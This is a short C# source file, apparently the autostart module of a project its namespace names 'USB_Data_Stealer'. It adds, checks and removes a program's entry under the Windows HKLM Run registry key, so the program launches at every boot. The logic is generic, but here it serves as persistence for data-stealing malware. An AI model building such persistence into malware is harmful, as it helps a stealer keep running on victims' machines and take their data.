using System;
using System.Diagnostics;
using Microsoft.Win32;

namespace USB_Data_Stealer.Core
{
    public static class Autorun
    {
        private const string RunKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        public static bool Enabled { get; private set; }

        public static bool IsEnabled(string appName)
        {
            try
            {
                RegistryKey startupKey = Registry.LocalMachine.OpenSubKey(RunKey);

                Debug.Assert(startupKey != null, "startupKey != null");
                Enabled = startupKey.GetValue(appName) != null;
            }
            catch (Exception)
            {
                return false;
            }

            return Enabled;
        }

        public static void Enable(string appName, string appExePath)
        {
            RegistryKey startupKey = Registry.LocalMachine.OpenSubKey(RunKey, true);
            Debug.Assert(startupKey != null, "startupKey != null");
            startupKey.SetValue(appName, appExePath);
            startupKey.Close();
            Enabled = true;
        }

        public static void Disable(string appname)
        {
            RegistryKey startupKey = Registry.LocalMachine.OpenSubKey(RunKey, true);
            Debug.Assert(startupKey != null, "startupKey != null");
            startupKey.DeleteValue(appname, false);
            startupKey.Close();
            Enabled = false;
        }
    }
}